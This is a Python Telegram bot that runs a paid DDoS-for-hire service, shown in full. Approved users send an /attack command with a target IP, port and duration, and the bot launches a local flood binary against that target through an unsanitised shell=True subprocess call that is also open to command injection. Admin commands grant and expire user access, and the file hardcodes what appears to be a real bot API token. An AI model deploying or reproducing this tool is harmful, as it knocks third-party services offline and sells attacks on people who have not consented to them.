import time
import asyncio
import threading
import subprocess  # Import subprocess module
import logging
from datetime import timedelta
from telebot import TeleBot, types

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Replace with your bot's token
API_TOKEN = '7937649304:AAFnbMhHKxQxfkX5aaxpThgHjio_ZUXO6eE'
bot = TeleBot(API_TOKEN)

attack_in_progress = False
attack_start_time = None
attack_duration = 0
users = {}  # User data with expiration timestamp

def create_inline_keyboard():
    logger.debug("Creating inline keyboard")
    markup = types.InlineKeyboardMarkup()
    button3 = types.InlineKeyboardButton(text="❤‍🩹 𝗝𝗼𝗶𝗻 𝗢𝘂𝗿 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 ❤‍🩹", url="https://t.me/drabhacks")
    button1 = types.InlineKeyboardButton(text="👤 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘄𝗻𝗲𝗿 👤", url="t.me/drabbyt")
    markup.add(button3)
    markup.add(button1)
    return markup

@bot.message_handler(commands=['start'])
def start_message(message):
    logger.info(f"Start command received from {message.from_user.id}")
    try:
        bot.send_message(message.chat.id, "*🌍 WELCOME TO DDOS WORLD!* 🎉\n\n"
                                           "*🚀 Get ready to dive into the action!*\n\n"
                                           "*💣 To unleash your power, use the* `/attack` *command followed by your target's IP and port.* ⚔️\n\n"
                                           "*🔍 Example: After* `/attack`, *enter:* `ip port duration`.\n\n"
                                           "*🔥 Ensure your target is locked in before you strike!*\n\n"
                                           "*📚 New around here? Check out the* `/help` *command to discover all my capabilities.* 📜\n\n"
                                           "*⚠️ Remember, with great power comes great responsibility! Use it wisely... or let the chaos reign!* 😈💥", 
                                           reply_markup=create_inline_keyboard(), parse_mode='Markdown')
    except Exception as e:
        logger.error(f"Error while processing /start command: {e}")

@bot.message_handler(commands=['owner'])
def owner_command(message):
    logger.info(f"Owner command received from {message.from_user.id}")
    response = (
        "*👤 **Owner Information:**\n\n"
        "For any inquiries, support, or collaboration opportunities, don't hesitate to reach out to the owner:\n\n"
        "📩 **Telegram:** @drabbyt\n\n"
        "💬 **We value your feedback!** Your thoughts and suggestions are crucial for improving our service and enhancing your experience.\n\n"
        "🌟 **Thank you for being a part of our community!** Your support means the world to us, and we’re always here to help!*\n"
    )
    bot.send_message(message.chat.id, response, reply_markup=create_inline_keyboard(), parse_mode='Markdown')

@bot.message_handler(commands=['add'])
def add_user(message):
    # Only admin (replace with actual admin ID)
    logger.info(f"Add user command received from {message.from_user.id}")
    if message.from_user.id != 1793697840:
        bot.send_message(message.chat.id, "*⚠️ You need admin approval to use this command.*", parse_mode='Markdown', reply_markup=create_inline_keyboard())
        return

    try:
        user_id, days = message.text.split()[1], int(message.text.split()[2])
        expiration_timestamp = int(time.time()) + (days * 86400)  # Calculate expiration timestamp
        users[user_id] = expiration_timestamp
        bot.send_message(message.chat.id, f"*✔️ User {user_id} added for {days} days.*", parse_mode='Markdown', reply_markup=create_inline_keyboard())
        logger.info(f"User {user_id} added for {days} days.")
    except Exception as e:
        bot.send_message(message.chat.id, "*⚠️ Usage: /add <user_id> <days>*", parse_mode='Markdown', reply_markup=create_inline_keyboard())
        logger.error(f"Error processing /add command: {e}")

@bot.message_handler(commands=['rem'])
def remove_user(message):
    # Only admin (replace with actual admin ID)
    logger.info(f"Remove user command received from {message.from_user.id}")
    if message.from_user.id != 1793697840:
        bot.send_message(message.chat.id, "*⚠️ You need admin approval to use this command.*", parse_mode='Markdown', reply_markup=create_inline_keyboard())
        return

    try:
        user_id = message.text.split()[1]
        if user_id in users:
            del users[user_id]
            bot.send_message(message.chat.id, f"*✔️ User {user_id} removed.*", parse_mode='Markdown', reply_markup=create_inline_keyboard())
            logger.info(f"User {user_id} removed.")
        else:
            bot.send_message(message.chat.id, "*⚠️ User not found in the approved list.*", parse_mode='Markdown', reply_markup=create_inline_keyboard())
            logger.warning(f"User {user_id} not found for removal.")
    except Exception as e:
        bot.send_message(message.chat.id, "*⚠️ Usage: /rem <user_id>*", parse_mode='Markdown', reply_markup=create_inline_keyboard())
        logger.error(f"Error processing /rem command: {e}")

@bot.message_handler(commands=['attack'])
def attack(message):
    global attack_in_progress, attack_start_time, attack_duration

    user_id = str(message.from_user.id)
    logger.info(f"Attack command received from {message.from_user.id}")
    if user_id not in users:
        bot.send_message(message.chat.id, "*⚠️ You need to be approved to use this bot.*", parse_mode='Markdown', reply_markup=create_inline_keyboard())
        logger.warning(f"User {user_id} not approved.")
        return

    expiration_timestamp = users[user_id]
    if expiration_timestamp < int(time.time()):
        del users[user_id]  # Remove expired user
        bot.send_message(message.chat.id, "*⚠️ Your access has expired.*", parse_mode='Markdown', reply_markup=create_inline_keyboard())
        logger.warning(f"User {user_id} access expired.")
        return

    if attack_in_progress:
        remaining_time = int(attack_start_time + attack_duration - time.time())
        if remaining_time > 0:
            remaining_time_str = str(timedelta(seconds=remaining_time))
            bot.send_message(message.chat.id, f"*⚠️ Another attack is in progress. Please wait.*\n*⏳ Remaining Time: {remaining_time_str}*", parse_mode='Markdown', reply_markup=create_inline_keyboard())
            logger.info(f"Attack already in progress. Remaining time: {remaining_time_str}")
        return

    try:
        ip, port, duration = message.text.split()[1], message.text.split()[2], int(message.text.split()[3])
        bot.send_message(message.chat.id, 
    f"*⚔️ **Attack Launched!** ⚔️*\n"
    f"*🎯 **Target:** {ip}:{port}*\n"
    f"*🕒 **Duration:** {duration} seconds*\n"
    f"*🔥 **Mayhem initiated! Let the battlefield ignite!** 💥*",
    reply_markup=create_inline_keyboard(), parse_mode='Markdown')

        attack_in_progress = True
        attack_start_time = time.time()
        attack_duration = duration

        # Run the attack asynchronously in a new thread
        attack_thread = threading.Thread(target=run_attack_command, args=(message.chat.id, ip, port, duration))
        attack_thread.start()
        logger.info(f"Attack launched on {ip}:{port} for {duration} seconds.")
        
    except Exception as e:
        bot.send_message(message.chat.id, "*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown', reply_markup=create_inline_keyboard())
        logger.error(f"Error processing /attack command: {e}")

def run_attack_command(chat_id, target_ip, target_port, duration):
    logger.info(f"Running attack command: {target_ip}:{target_port} for {duration} seconds")
    # Run the attack command (replace with your binary file path)
    process = subprocess.Popen(f"./bgmi {target_ip} {target_port} {duration} 10", shell=True)
    process.wait()  # Wait for the process to finish
    
    global attack_in_progress
    attack_in_progress = False  # Reset the attack flag
    
    # Notify the user about the attack completion
    bot.send_message(chat_id, "*✅ Attack Completed! ✅*\n"
                               "*The attack has been successfully executed.*\n"
                               "*Thank you for using our service!*", 
                               reply_markup=create_inline_keyboard(), parse_mode='Markdown')
    logger.info("Attack completed and notification sent.")

# Start the bot polling
if __name__ == '__main__':
    logger.info("Bot started polling.")
    bot.polling(none_stop=True)
